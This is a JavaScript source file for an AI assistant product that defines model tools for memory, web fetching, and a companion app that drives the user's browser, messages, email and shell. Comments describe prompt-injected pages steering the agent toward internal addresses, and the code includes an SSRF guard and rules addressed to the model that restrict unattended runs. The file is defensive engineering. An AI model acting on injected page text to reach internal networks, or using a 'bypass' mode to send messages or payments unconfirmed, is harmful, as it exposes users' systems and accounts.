import Anthropic from '@anthropic-ai/sdk';
import { lookup } from 'node:dns/promises';
import { isIP } from 'node:net';
import { assertSpendSafeShell } from './spend-safety.js';
import { remember, recall, recentMemories, coreMemories, allMemories, vitalsWindow, findMemory, updateMemory, getProjectMap } from './memory.js';
import { computeVitals } from './vitals.js';
import * as companion from './companion.js';
import * as pendingNotes from './pending-notes.js';
import { findUserById, listSkills, mergePreferences } from './auth.js';
import { discoverAllConnectorTools, invokeConnectorTool, isConnectorToolName } from './connectors.js';
import { listCodeFiles, findCodeFileByName, writeCodeFile, editCodeFile, deleteCodeFileByName, languageDisplayName, workspaceRoot, searchFiles } from './codeFiles.js';
import { runCommand } from './codeExecution.js';

const client = new Anthropic(); // reads ANTHROPIC_API_KEY from env

// Custom-branded model tiers (Neurovance's own names, matching auth.js's
// MODEL_TIERS) mapped to real underlying Claude models. "core" keeps the
// exact model every existing conversation has always run on — adding tiers
// doesn't change anyone's behavior until they actually pick "pulse".
const MODEL_IDS = {
  pulse: 'claude-haiku-4-5-20251001',
  core: 'claude-sonnet-4-6',
};
function resolveModel(tier) {
  return MODEL_IDS[tier] || MODEL_IDS.core;
}

// Effort level -> Anthropic extended-thinking budget. "low" (the default)
// stays exactly as every conversation already behaved — no thinking param
// sent at all. Everything above it makes the model actually reason before
// answering, at the cost of latency. max_tokens has to exceed budget_tokens
// (the API rejects it otherwise, since thinking tokens count against the
// same cap), so resolveThinking returns both together rather than letting
// a caller forget to raise the ceiling to match.
const THINKING_BUDGETS = {
  low: 0,
  medium: 2000,
  high: 6000,
  max: 12000,
  extreme: 24000,
};
function resolveThinking(effortLevel, baseMaxTokens) {
  const budget = THINKING_BUDGETS[effortLevel] || 0;
  if (!budget) return { thinking: undefined, maxTokens: baseMaxTokens };
  return { thinking: { type: 'enabled', budget_tokens: budget }, maxTokens: budget + baseMaxTokens };
}

const MEMORY_TOOL = {
  name: 'remember',
  description:
    'Save a fact, preference, or lesson worth keeping for future conversations. Only call this for things that would actually be useful to recall later — not routine chat.',
  input_schema: {
    type: 'object',
    properties: {
      content: { type: 'string', description: 'The fact to remember, written so it stands alone without today\'s context.' },
      tags: { type: 'array', items: { type: 'string' }, description: 'Short topic tags for later retrieval.' },
      importance: { type: 'integer', description: '1 (minor) to 5 (critical) — how much weight this should get during recall.' },
    },
    required: ['content', 'tags', 'importance'],
  },
};

const VERIFY_TOOL = {
  name: 'verify_solution',
  description:
    'Run a verification script located in .claude/verify/ to confirm a coding solution works. Use this as a mandatory gate before finalizing any code change. Input is the filename of the script to run.',
  input_schema: {
    type: 'object',
    properties: {
      scriptName: { type: 'string', description: 'The name of the script in .claude/verify/ to execute, e.g. "test_auth.js".' },
    },
    required: ['scriptName'],
  },
};

const SEARCH_TOOL = {
  name: 'search_web',
  description:
    'Look up a well-known topic via DuckDuckGo\'s instant-answer lookup. Free, no API key. ' +
    'Important: this only matches short topic/entity names, not questions — query with "Gabriel Weinberg" not "who created DuckDuckGo". ' +
    'It returns nothing for most natural-language questions, breaking news, or niche topics — treat an empty result as inconclusive, not as "this doesn\'t exist".',
  input_schema: {
    type: 'object',
    properties: {
      query: { type: 'string', description: 'A short topic or entity name, e.g. "Gabriel Weinberg", not a full question.' },
    },
    required: ['query'],
  },
};

const FETCH_WEBPAGE_TOOL = {
  name: 'fetch_webpage',
  description:
    'Fetch the full text content of a real webpage by URL and read it, so you can actually read a page instead of only getting a one-line search answer. Free, no API key. Public https:// URLs only — never credentials, never private or internal addresses, and it never logs in to anything. Returns the page stripped to plain text, capped at ~100KB. Use this when a task depends on what a specific page actually says (an article, a doc, a reference) rather than a general topic.',
  input_schema: {
    type: 'object',
    properties: {
      url: { type: 'string', description: 'The full https:// URL of the page to read.' },
    },
    required: ['url'],
  },
};

// SSRF guard — the same concern that keeps the Connectors feature safe. The
// fetch runs from the server's own network, so an unrestricted URL would let
// a (possibly prompt-injected) instruction point it at the server's own
// internal network or a cloud metadata endpoint. https-only plus a hard
// refusal of loopback/private/link-local addresses blocks the direct cases,
// and a regex clamps the URL to public http(s) forms for the rest.
async function isForbiddenFetchUrl(raw) {
  let url;
  try {
    if (!/^https:\/\//i.test(raw || '')) return 'URL must start with https://';
    url = new URL(raw);
  } catch {
    return 'That is not a valid URL.';
  }
  if (url.username || url.password) return 'URLs must not contain embedded credentials.';
  const hostname = url.hostname.replace(/^\[|\]$/g, '').toLowerCase();
  if (!hostname) return 'URL must include a host.';
  if (hostname === 'localhost' || hostname.endsWith('.localhost')) return 'Local/internal addresses are not allowed.';
  if (hostname.endsWith('.local') || hostname.endsWith('.internal'))
    return 'Local/internal addresses are not allowed.';

  // Resolve the host to catch IP literals as well as names that DNS would
  // map back to the local machine or a private network (including the cloud
  // metadata ranges). A name that fails to resolve is treated as forbidden
  // too — non-public hosts are never worth fetching.
  try {
    const res = await lookup(hostname, { all: true });
    if (!res || res.length === 0) return 'Host does not resolve to a public address.';
    // A host can return both v4 and v6 — block if ANY address is private.
    for (const entry of res) {
      const err = isPrivateIp(entry.address);
      if (err) return err;
    }
  } catch {
    return 'Host does not resolve to a public address.';
  }
  return null;
}

// Range checks for IPv4 literals plus a normalized v4-mapped IPv6 form.
function isPrivateIp(input) {
  let addr = String(input || '');
  const v4mapped = addr.match(/^::ffff:(\d+\.\d+\.\d+\.\d+)$/i);
  if (v4mapped) addr = v4mapped[1];

  // IPv4 (also covers the common v4-mapped cases after unwrapping).
  if (isIP(addr) === 4) {
    const parts = addr.split('.').map(Number);
    const [a, b] = parts;
    if (a === 0 || a === 10) return 'Private IP addresses are not allowed.';
    if (a === 127) return 'Loopback addresses are not allowed.';
    if (a === 169 && b === 254) return 'Link-local (cloud metadata) addresses are not allowed.';
    if (a === 172 && b >= 16 && b <= 31) return 'Private IP addresses are not allowed.';
    if (a === 192 && b === 168) return 'Private IP addresses are not allowed.';
    if (a === 100 && b >= 64 && b <= 127) return 'Private IP addresses are not allowed.';
    return null;
  }

  // IPv6.
  if (isIP(addr) === 6) {
    const lower = addr.toLowerCase();
    if (lower === '::' || lower === '::1') return 'Loopback addresses are not allowed.';
    if (lower.startsWith('fc') || lower.startsWith('fd')) return 'ULA (private) addresses are not allowed.';
    if (lower.startsWith('fe8') || lower.startsWith('fe9') || lower.startsWith('fea') || lower.startsWith('feb'))
      return 'Link-local addresses are not allowed.';
    return null;
  }

  return null;
}

// Downloads a public page to plain text for the brain to read. Timeout and
// size caps keep a single fetch bounded (a runaway page can't hang the loop
// or blow up context). Returns a clean text blob, or throws a friendly error.
const FETCH_TIMEOUT_MS = 10_000;
const FETCH_MAX_BYTES = 250_000;
const FETCH_MAX_TEXT = 100_000;
const FETCH_MAX_REDIRECTS = 5;
async function fetchPage(url) {
  const blocker = await isForbiddenFetchUrl(url);
  if (blocker) throw new Error(blocker);

  // Redirects must not silently hop to a private/internal address. The
  // initial URL is validated above, but `fetch` with redirect:'follow' would
  // chase a 302 without re-checking the destination — the classic SSRF
  // bypass (a public page redirecting to 169.254.169.254 or 127.0.0.1).
  // So follow manually, validating the Location header on every hop.
  let current = url;
  let hop = 0;
  for (; hop <= FETCH_MAX_REDIRECTS; hop++) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
    let res;
    try {
      res = await fetch(current, {
        redirect: 'manual',
        signal: controller.signal,
        headers: { 'user-agent': 'NeurovanceBrain/0.1', 'accept': 'text/html,text/plain' },
      });
    } catch (e) {
      throw new Error(e.name === 'AbortError' ? 'Fetch timed out.' : 'Could not fetch that page.');
    } finally {
      clearTimeout(timer);
    }

    if (res.status >= 300 && res.status < 400) {
      if (hop === FETCH_MAX_REDIRECTS) throw new Error('Too many redirects.');
      const location = res.headers.get('location');
      if (!location) throw new Error('That page redirected without a target.');
      current = new URL(location, current).toString();
      const redirectBlock = await isForbiddenFetchUrl(current);
      if (redirectBlock) throw new Error('Redirected to a forbidden address.');
      continue; // re-fetch the next hop
    }

    if (!res.ok) throw new Error(`That page returned HTTP ${res.status}.`);
    if (!/^text\//.test(res.headers.get('content-type') || '')) {
      throw new Error('That URL is not a text page (not HTML/text) — nothing useful to read.');
    }
    const buffer = await res.arrayBuffer();
    let raw = Buffer.from(buffer.slice(0, FETCH_MAX_BYTES)).toString('utf8');

    // Strip the framing so the model reads content, not markup: drop scripts/
    // styles/tags and collapse whitespace. Imperfect vs a real DOM parser, but
    // good enough to actually read an article and costs no dependencies.
    raw = raw.replace(/<script[\s\S]*?<\/script>/gi, ' ')
              .replace(/<style[\s\S]*?<\/style>/gi, ' ')
              .replace(/<[^>]+>/g, ' ')
              .replace(/&nbsp;/g, ' ')
              .replace(/&amp;/g, '&')
              .replace(/&lt;/g, '<')
              .replace(/&gt;/g, '>')
              .replace(/\s+/g, ' ')
              .trim();
    return raw.slice(0, FETCH_MAX_TEXT);
  }
}

// Companion tools — only offered when this user has actually paired the
// local Companion app (agent.js never assumes it's there). Read-only by
// design for now: listing/reading a folder the user chose, and opening a
// browser link. Write/delete comes later, behind an explicit confirmation
// step, the same way the waitlist broadcast requires one before it sends.
//
// Browser actions drive whichever real browser the user picked in Settings
// (Safari or Chrome, default Safari) — these tool descriptions say "browser"
// generically since the choice is per-user, resolved server-side in
// handleCompanionTool, not baked into the tool definition itself.
const COMPANION_LIST_FILES_TOOL = {
  name: 'list_local_files',
  description:
    'List files and folders inside the user\'s local Neurovance folder on their own computer, via their paired Companion app. Read-only, and scoped to that one folder only — nothing else on their computer is reachable.',
  input_schema: {
    type: 'object',
    properties: {
      subpath: { type: 'string', description: 'Relative path inside the allowed folder — empty string for the root, or e.g. "notes" for a subfolder.' },
    },
  },
};

const COMPANION_READ_FILE_TOOL = {
  name: 'read_local_file',
  description:
    'Read a text file inside the user\'s local Neurovance folder, via their paired Companion app. Read-only, scoped to that one folder, capped at 200KB per file.',
  input_schema: {
    type: 'object',
    properties: {
      path: { type: 'string', description: 'Relative path to the file inside the allowed folder.' },
    },
    required: ['path'],
  },
};

const COMPANION_OPEN_URL_TOOL = {
  name: 'open_url_in_browser',
  description:
    'Open a URL in the user\'s own browser on their computer, via their paired Companion app, so they see it appear live. Only https:// URLs.',
  input_schema: {
    type: 'object',
    properties: {
      url: { type: 'string', description: 'A full https:// URL.' },
    },
    required: ['url'],
  },
};

const COMPANION_READ_BROWSER_TOOL = {
  name: 'read_current_browser_page',
  description:
    'Read the visible text of whatever page is currently open in the user\'s own browser (front tab only), via their paired Companion app. Only ever sees a page AFTER the user has already loaded and logged into it themselves — this cannot log in, fill in a form, or touch a credential. Only use this when the user has actually asked you to check or read something on their screen, e.g. right after asking them to log in somewhere. Never assume something is open unless they said so.',
  input_schema: { type: 'object', properties: {} },
};

const COMPANION_READ_BOOKMARKS_TOOL = {
  name: 'read_safari_bookmarks',
  description:
    'Read the user\'s saved Safari bookmarks (title + URL), via their paired Companion app. Always reads Safari\'s bookmarks specifically, regardless of which browser they\'ve set as their default in Settings. Use this to actually go find a link the user has already saved — e.g. a school portal, a work tool — BEFORE asking them to type a URL by hand. Read-only, cannot add or remove bookmarks.',
  input_schema: { type: 'object', properties: {} },
};

const COMPANION_CLICK_TOOL = {
  name: 'click_page_element',
  description:
    'Click a link or button on whatever page is currently open in the user\'s own browser, matched by its visible text (not a CSS selector — match the text you can actually see on the page, e.g. from read_current_browser_page). Free to use for ordinary navigation, search, and lookups. Before using this to click anything that completes a purchase/payment, sends a message, or deletes/cancels/removes an account or data — stop and confirm with the user first instead of calling this.',
  input_schema: {
    type: 'object',
    properties: {
      text: { type: 'string', description: 'The visible text of the link or button to click, e.g. "Sign in" or "Next".' },
    },
    required: ['text'],
  },
};

const COMPANION_TYPE_TOOL = {
  name: 'type_into_page_field',
  description:
    'Type text into an input or textarea on the current browser page, matched by its placeholder/label text. Never works on password fields — refuses those unconditionally. Set submit:true to also press Enter after typing (e.g. for a search box). Free to use for search boxes, lookup forms, and filters. Before using this to fill in and submit anything that completes a purchase/payment, sends a message, or contains sensitive personal data going to a new destination — stop and confirm with the user first instead of calling this.',
  input_schema: {
    type: 'object',
    properties: {
      label: { type: 'string', description: 'Text identifying the field, e.g. "search" or "email".' },
      text: { type: 'string', description: 'The text to type into it.' },
      submit: { type: 'boolean', description: 'If true, press Enter after typing (default false).' },
    },
    required: ['label', 'text'],
  },
};

const COMPANION_GO_BACK_TOOL = {
  name: 'go_back_in_browser',
  description: 'Go back to the previous page in the user\'s own browser — the same as clicking the browser\'s back button. Free to use any time it makes sense in the conversation.',
  input_schema: { type: 'object', properties: {} },
};

const COMPANION_LIST_ELEMENTS_TOOL = {
  name: 'list_page_elements',
  description:
    'List every clickable thing on the current browser page — its visible text (or accessible label, which is often where a color/size shows up even when it\'s only a swatch, e.g. "Color: Red") and its real on-screen position, sorted top-to-bottom then left-to-right. Use this to resolve a vague reference like "the red one", "the one on top", or "the second result" to an actual element before calling click_page_element — pick the matching entry from this list, then click_page_element with THAT entry\'s exact text.',
  input_schema: { type: 'object', properties: {} },
};

// Chrome-extension only — no AppleScript equivalent, so these silently
// fail with a clear "needs the extension" error if only the desktop
// Companion is connected. Every other browser action after switch_to_tab
// acts on that tab specifically, not whatever happened to be active.
const COMPANION_LIST_TABS_TOOL = {
  name: 'list_open_tabs',
  description:
    'List every tab currently open in the user\'s Chrome — a small index, its title, and URL. Use this to find a tab you already know is open, e.g. "switch to my Gmail tab" or "go back to the page I had open", before calling switch_to_tab with that index. Chrome extension only — errors clearly if only the desktop Companion is connected.',
  input_schema: { type: 'object', properties: {} },
};

const COMPANION_SWITCH_TAB_TOOL = {
  name: 'switch_to_tab',
  description:
    'Bring an already-open tab to the front, by the index shown from list_open_tabs. Every browser action afterward (read/click/type/list/go back) then acts on THAT tab specifically, not whatever was active before — use this whenever the user refers to a tab they already have open rather than a new page. Chrome extension only.',
  input_schema: {
    type: 'object',
    properties: { index: { type: 'integer', description: 'The index shown next to the tab in list_open_tabs.' } },
    required: ['index'],
  },
};

const COMPANION_FIND_CONTACT_TOOL = {
  name: 'find_contact',
  description:
    'Search the user\'s own Contacts app by name (read-only — never adds, edits, or removes a contact) and return matching people with their phone numbers and emails. Use this to resolve something like "text mom" to an actual number before using send_text_message.',
  input_schema: {
    type: 'object',
    properties: {
      query: { type: 'string', description: 'A name or partial name to search Contacts for, e.g. "mom" or "John".' },
    },
    required: ['query'],
  },
};

const COMPANION_SEND_MESSAGE_TOOL = {
  name: 'send_text_message',
  description:
    'Send a real iMessage/text from the user\'s own Messages app to one or more real people — this reaches someone else, not just the user. For more than one recipient, the same text is sent individually to each (not one shared group thread). ALWAYS stop and get the user\'s explicit go-ahead in chat before calling this, the same hard rule as a payment: say exactly who you\'re about to message and what you\'re about to say, then wait for their next message to actually confirm it. Never call this in the same turn you proposed it in.',
  input_schema: {
    type: 'object',
    properties: {
      recipients: {
        type: 'array', items: { type: 'string' },
        description: 'One or more phone numbers (e.g. "+15551234567") or email addresses to send to — get these from find_contact first if the user only gave names.',
      },
      text: { type: 'string', description: 'The exact message to send.' },
    },
    required: ['recipients', 'text'],
  },
};

const COMPANION_ADD_CALENDAR_EVENT_TOOL = {
  name: 'add_calendar_event',
  description:
    'Add a real event to the user\'s own default calendar. This is their own data, not something reaching anyone else, so it does not need the confirm-first treatment send_text_message does — just do it and report back what you added.',
  input_schema: {
    type: 'object',
    properties: {
      title: { type: 'string', description: 'Event title.' },
      startDateTime: { type: 'string', description: 'Start date/time, ISO 8601, e.g. "2026-08-21T15:00:00".' },
      endDateTime: { type: 'string', description: 'End date/time, ISO 8601.' },
    },
    required: ['title', 'startDateTime', 'endDateTime'],
  },
};

const COMPANION_ADD_REMINDER_TOOL = {
  name: 'add_reminder',
  description: 'Add a real reminder to the user\'s own default Reminders list. Their own data — just do it, no confirmation needed.',
  input_schema: {
    type: 'object',
    properties: {
      title: { type: 'string', description: 'What to be reminded of.' },
      dueDateTime: { type: 'string', description: 'Optional due date/time, ISO 8601. Omit for a reminder with no due date.' },
    },
    required: ['title'],
  },
};

const COMPANION_ADD_NOTE_TOOL = {
  name: 'add_note',
  description: 'Add a real note to the user\'s own Notes app. Their own data — just do it, no confirmation needed.',
  input_schema: {
    type: 'object',
    properties: {
      title: { type: 'string', description: 'Note title — becomes the first line.' },
      body: { type: 'string', description: 'Optional note content after the title.' },
    },
    required: ['title'],
  },
};

const COMPANION_READ_EMAILS_TOOL = {
  name: 'read_recent_emails',
  description: 'Read the user\'s most recent inbox emails (subject, sender, read/unread) from their own Mail app. Read-only, free to use anytime — no body text, just enough to see what\'s there.',
  input_schema: {
    type: 'object',
    properties: {
      limit: { type: 'integer', description: 'How many recent emails to read, max 20 (default 10).' },
    },
  },
};

const COMPANION_SEND_EMAIL_TOOL = {
  name: 'send_email',
  description: 'Send a real email from the user\'s own Mail app to a real person — this reaches someone else, not just the user. Same hard rule as send_text_message: ALWAYS state exactly who you\'re about to email and what it will say, then wait for their explicit go-ahead before calling this. Never call it in the same turn you proposed it in.',
  input_schema: {
    type: 'object',
    properties: {
      recipient: { type: 'string', description: 'Email address to send to.' },
      subject: { type: 'string', description: 'Email subject line.' },
      body: { type: 'string', description: 'Email body text.' },
    },
    required: ['recipient', 'subject', 'body'],
  },
};

const COMPANION_MUSIC_CONTROL_TOOL = {
  name: 'music_control',
  description: 'Play, pause, or skip in the user\'s own Music app. Their own local playback, reaches nobody else — free to use anytime, no confirmation needed.',
  input_schema: {
    type: 'object',
    properties: {
      command: { type: 'string', enum: ['play', 'pause', 'next', 'previous'], description: 'Playback command to run.' },
    },
    required: ['command'],
  },
};

const COMPANION_PLAY_SONG_TOOL = {
  name: 'play_song',
  description: 'Search the user\'s own Music library by song or artist name and play the first match. Own local library only, free to use anytime.',
  input_schema: {
    type: 'object',
    properties: {
      query: { type: 'string', description: 'Song title or artist name to search for.' },
    },
    required: ['query'],
  },
};

const COMPANION_MUSIC_STATUS_TOOL = {
  name: 'music_status',
  description: 'Read what\'s currently playing (or paused/stopped) in the user\'s own Music app. Read-only, free to use anytime.',
  input_schema: {
    type: 'object',
    properties: {},
  },
};

const COMPANION_RUN_SHELL_TOOL = {
  name: 'run_shell_command',
  description:
    'Run a real shell command on the user\'s own computer — full machine access once set up, not limited to one folder. Powerful: it can install packages, run scripts, move or delete files, anything a real terminal can do. The very first time this is ever used, the Companion will ask them, right there in their terminal, to pick a folder for it to work in — like opening a project folder in an editor — before anything runs; every call after that reuses the folder they picked. You do NOT need to get the user\'s go-ahead in chat first — before anything runs (including that first-time folder setup), the Companion shows them exactly what\'s happening on their own screen and waits for them to personally approve it right there, every single time, with no exceptions and regardless of their permission mode setting. If they decline, this returns a "Declined" error — tell them plainly and don\'t retry the same command without them asking you to.',
  input_schema: {
    type: 'object',
    properties: {
      command: { type: 'string', description: 'The exact shell command to run, e.g. "npm install express" or "python3 script.py".' },
      cwd: { type: 'string', description: 'Optional absolute path to run it in. Defaults to the coding folder they set up on first use.' },
    },
    required: ['command'],
  },
};

const ALL_COMPANION_TOOLS = [COMPANION_LIST_FILES_TOOL, COMPANION_READ_FILE_TOOL, COMPANION_OPEN_URL_TOOL, COMPANION_READ_BROWSER_TOOL, COMPANION_READ_BOOKMARKS_TOOL, COMPANION_CLICK_TOOL, COMPANION_TYPE_TOOL, COMPANION_GO_BACK_TOOL, COMPANION_LIST_ELEMENTS_TOOL, COMPANION_LIST_TABS_TOOL, COMPANION_SWITCH_TAB_TOOL, COMPANION_FIND_CONTACT_TOOL, COMPANION_SEND_MESSAGE_TOOL, COMPANION_ADD_CALENDAR_EVENT_TOOL, COMPANION_ADD_REMINDER_TOOL, COMPANION_ADD_NOTE_TOOL, COMPANION_READ_EMAILS_TOOL, COMPANION_SEND_EMAIL_TOOL, COMPANION_MUSIC_CONTROL_TOOL, COMPANION_PLAY_SONG_TOOL, COMPANION_MUSIC_STATUS_TOOL, COMPANION_RUN_SHELL_TOOL];
// Derived from the tool list itself, not hand-maintained separately — a
// tool added to ALL_COMPANION_TOOLS above without also being added to a
// second hardcoded name list here is exactly how read_current_browser_page
// silently never worked: offered to the model, but never actually dispatched.
const COMPANION_TOOL_NAMES = ALL_COMPANION_TOOLS.map((t) => t.name);

// run_shell_command is withheld outright from an unattended run — not just
// told not to use it, the way permission mode is a written instruction the
// model follows. A prompt-injected page or a scheduled 3am run can't call a
// tool that was never handed to it in the first place. The terminal-side
// confirm in companion.js is the other half of this same guarantee.
async function companionTools(userId, opts = {}) {
  if (!(await companion.isPaired(userId))) return [];
  const user = await findUserById(userId);
  const p = mergePreferences(user);
  // Shell is the single most powerful thing the Companion can do, so it is
  // OFF by default and only exposed when the user turns on the autonomous
  // "Run shell commands" ability in Settings. Unattended runs never get it
  // regardless — that's the spend/safety line (see assertSpendSafeShell).
  if (opts.unattended || p.shellAccess !== true) {
    return ALL_COMPANION_TOOLS.filter((t) => t.name !== 'run_shell_command');
  }
  return ALL_COMPANION_TOOLS;
}

async function handleCompanionTool(userId, toolUse) {
  if (toolUse.name === 'list_local_files') {
    const files = await companion.sendCommand(userId, 'list_files', { subpath: toolUse.input.subpath || '' });
    return JSON.stringify(files);
  }
  if (toolUse.name === 'read_local_file') {
    return await companion.sendCommand(userId, 'read_file', { path: toolUse.input.path });
  }
  if (toolUse.name === 'read_safari_bookmarks') {
    const bookmarks = await companion.sendCommand(userId, 'read_safari_bookmarks', {});
    return JSON.stringify(bookmarks);
  }
  // Every action below drives whichever real browser the user picked in
  // Settings (default Safari) — the Companion itself has no opinion, it
  // just needs to know which app to send the AppleScript to.
  const BROWSER_TOOL_NAMES = new Set([
    'open_url_in_browser', 'read_current_browser_page', 'click_page_element',
    'type_into_page_field', 'go_back_in_browser', 'list_page_elements',
  ]);
  let browser = 'safari';
  if (BROWSER_TOOL_NAMES.has(toolUse.name)) {
    const user = await findUserById(userId);
    browser = user?.browser === 'chrome' ? 'chrome' : 'safari';
  }
  if (toolUse.name === 'open_url_in_browser') {
    const result = await companion.sendCommand(userId, 'open_url', { url: toolUse.input.url, browser });
    return `Opened in ${browser === 'chrome' ? 'Chrome' : 'Safari'}: ${result.opened}`;
  }
  if (toolUse.name === 'read_current_browser_page') {
    const result = await companion.sendCommand(userId, 'read_safari_content', { browser });
    return `Page: ${result.title} (${result.url})\n\n${result.text}`;
  }
  if (toolUse.name === 'click_page_element') {
    const result = await companion.sendCommand(userId, 'click_page_element', { text: toolUse.input.text, browser });
    return result.result;
  }
  if (toolUse.name === 'type_into_page_field') {
    const result = await companion.sendCommand(userId, 'type_into_page_field', {
      label: toolUse.input.label,
      text: toolUse.input.text,
      submit: !!toolUse.input.submit,
      browser,
    });
    return result.result;
  }
  if (toolUse.name === 'go_back_in_browser') {
    await companion.sendCommand(userId, 'go_back', { browser });
    return 'Went back.';
  }
  if (toolUse.name === 'list_page_elements') {
    const result = await companion.sendCommand(userId, 'list_page_elements', { browser });
    return JSON.stringify(result.elements);
  }
  if (toolUse.name === 'list_open_tabs') {
    const result = await companion.sendCommand(userId, 'list_open_tabs', {});
    return JSON.stringify(result.tabs);
  }
  if (toolUse.name === 'switch_to_tab') {
    const result = await companion.sendCommand(userId, 'switch_to_tab', { index: toolUse.input.index });
    return `Switched to: ${result.switched}`;
  }
  if (toolUse.name === 'find_contact') {
    const result = await companion.sendCommand(userId, 'find_contact', { query: toolUse.input.query });
    return JSON.stringify(result.contacts);
  }
  if (toolUse.name === 'send_text_message') {
    const result = await companion.sendCommand(userId, 'send_text_message', {
      recipients: toolUse.input.recipients,
      text: toolUse.input.text,
    });
    return `Sent to ${result.recipients.join(', ')}.`;
  }
  if (toolUse.name === 'add_calendar_event') {
    const result = await companion.sendCommand(userId, 'add_calendar_event', {
      title: toolUse.input.title,
      startDateTime: toolUse.input.startDateTime,
      endDateTime: toolUse.input.endDateTime,
    });
    return `Added "${result.title}" to their calendar.`;
  }
  if (toolUse.name === 'add_reminder') {
    const result = await companion.sendCommand(userId, 'add_reminder', {
      title: toolUse.input.title,
      dueDateTime: toolUse.input.dueDateTime,
    });
    return `Added reminder: "${result.title}".`;
  }
  if (toolUse.name === 'add_note') {
    const result = await companion.sendCommand(userId, 'add_note', {
      title: toolUse.input.title,
      body: toolUse.input.body,
    });
    return `Added note: "${result.title}".`;
  }
  if (toolUse.name === 'read_recent_emails') {
    const result = await companion.sendCommand(userId, 'read_recent_emails', { limit: toolUse.input.limit });
    return JSON.stringify(result.emails);
  }
  if (toolUse.name === 'send_email') {
    const result = await companion.sendCommand(userId, 'send_email', {
      recipient: toolUse.input.recipient,
      subject: toolUse.input.subject,
      body: toolUse.input.body,
    });
    return `Sent to ${result.recipient}.`;
  }
  if (toolUse.name === 'music_control') {
    await companion.sendCommand(userId, 'music_control', { command: toolUse.input.command });
    return `Did ${toolUse.input.command}.`;
  }
  if (toolUse.name === 'play_song') {
    const result = await companion.sendCommand(userId, 'play_song', { query: toolUse.input.query });
    if (!result.found) return `No song matching "${toolUse.input.query}" in their library.`;
    return `Now playing "${result.name}" by ${result.artist}.`;
  }
  if (toolUse.name === 'music_status') {
    const result = await companion.sendCommand(userId, 'music_status', {});
    if (result.state === 'stopped') return 'Nothing is playing right now.';
    return `${result.state}: "${result.name}" by ${result.artist}.`;
  }
  if (toolUse.name === 'run_shell_command') {
    const blocked = assertSpendSafeShell(toolUse.input.command);
    if (blocked) return `Refused: ${blocked} This command would touch advertising/billing/payment systems and is never run by this assistant, even in bypass mode.`;
    const result = await companion.sendCommand(userId, 'run_shell_command', {
      command: toolUse.input.command,
      cwd: toolUse.input.cwd,
    });
    return JSON.stringify(result);
  }
  return null;
}

// Spend-safety blocklist lives in ./spend-safety.js (shared with the code
// sandbox terminal). Re-exported here so the run_shell_command handler and
// anything else importing agent.js keeps the same API.
export { assertSpendSafeShell };

async function searchWeb(query) {
  const url = `https://api.duckduckgo.com/?q=${encodeURIComponent(query)}&format=json&no_html=1&skip_disambig=1`;
  const res = await fetch(url);
  const data = await res.json();

  const parts = [];
  if (data.Answer) parts.push(`Answer: ${data.Answer}`);
  if (data.AbstractText) parts.push(`Summary: ${data.AbstractText}${data.AbstractURL ? ` (source: ${data.AbstractURL})` : ''}`);
  if (data.Definition) parts.push(`Definition: ${data.Definition}${data.DefinitionURL ? ` (source: ${data.DefinitionURL})` : ''}`);
  if (data.RelatedTopics?.length) {
    const related = data.RelatedTopics.slice(0, 3).map((t) => t.Text).filter(Boolean);
    if (related.length) parts.push(`Related: ${related.join(' | ')}`);
  }

  return parts.length ? parts.join('\n') : 'No results found for that query.';
}

// Tracked per-user so the UI can flash the exact nodes that user's AI actually
// drew on for its last reply — "watch it think" only means something if it's
// real activity, and it must never leak between different users' sessions.
const lastRecallByUser = new Map();
export function getLastRecall(userId) {
  return lastRecallByUser.get(userId) || { ids: [], ts: null };
}

async function memoryContext(userId, query) {
  // Keyword recall alone misses paraphrased or indirect phrasing constantly
  // (voice conversation rarely reuses a memory's exact words), so core
  // identity facts are always included regardless of whether this turn's
  // wording happens to overlap with them.
  const [core, relevant, recent] = await Promise.all([
    coreMemories(userId, 8),
    recall(userId, query, 5),
    recentMemories(userId, 3),
  ]);
  const seen = new Set();
  const combined = [...core, ...relevant, ...recent]
    .filter((m) => (seen.has(m.id) ? false : seen.add(m.id)));

  lastRecallByUser.set(userId, { ids: combined.map((m) => m.id), ts: Date.now() });

  return combined
    .map((m) => `- [${m.timestamp.slice(0, 10)}] ${m.content}`)
    .join('\n');
}

// User-written custom instructions, saved in Settings — plain text the
// model follows, same trust level as anything else in the prompt (no code
// execution, no new capability — that's what a connector is for).
function skillsLine(skills) {
  if (!skills || skills.length === 0) return '';
  const list = skills.map((s) => `- ${s.name}: ${s.instructions}`).join('\n');
  return `They've saved these custom skills. Actually follow them — these are explicit instructions they wrote for you, not optional flavor to weigh against your default behavior:\n${list}`;
}

// Governs confirmation behavior globally, replacing the scattered "no
// confirmation needed" qualifiers that used to live on individual tool
// descriptions — one clear directive instead of the model having to
// reconcile several partial ones. 'ask' has no exception list: everything
// pauses for confirmation, not just the previously-risky stuff. 'bypass'
// (the default) has no exception list either, in the other direction —
// the user explicitly chose full autonomy, including payments/messages/
// deletes, so second-guessing that by asking anyway is the wrong move.
function permissionModeLine(user, { voice = false } = {}) {
  const waitPhrase = voice ? 'wait for them to actually say to go ahead, out loud' : 'end your turn and wait for their next message to actually confirm it';
  if (user?.permissionMode === 'ask') {
    return `Their permission mode is set to "always ask": before EVERY companion action — opening a page, clicking something, adding a calendar event, reading email, all of it, not just payments or messages — say exactly what you are about to do in plain language, then ${waitPhrase}. Never act in the same turn you proposed something in, for anything.`;
  }
  return 'Their permission mode is set to "bypass": act freely and immediately on every companion action, including completing a payment/purchase, sending a message, or deleting/canceling something — no pausing to confirm first, for anything. They have explicitly chosen full autonomy; do not second-guess that by asking anyway.';
}

// A scheduled run has no live user to confirm anything, no matter what
// their permission mode says — "bypass" means bypass *their own*
// confirmation step in a session they're driving, not "send things while
// nobody's watching." This line replaces permissionModeLine entirely for
// unattended runs rather than layering on top of it.
const UNATTENDED_SAFETY_LINE = 'This is an unattended scheduled run — nobody is present to confirm anything, regardless of their permission mode setting. Freely read, check, and browse (calendar, inbox, open tabs, pages) and prepare drafts, but do NOT send a message or email, complete a purchase, or delete/cancel anything — prepare it and report what you found or drafted so they can send it themselves.';

function languageLine(user) {
  const language = user?.language;
  if (!language || language === 'English') return '';
  return `Their set reply language is ${language} — always reply in ${language}, even on a short or casual message and even if they happen to type to you in English, unless they explicitly ask you to switch languages.`;
}

// Builds the communication-style instruction from the machine-tuning prefs
// (verbosity / formality / free-form tone). Returns an array of lines (flat
// via join) so callers can drop it into their system prompt.
function communicationLines(prefs) {
  const lines = [];
  if (prefs?.verbosity === 'concise') {
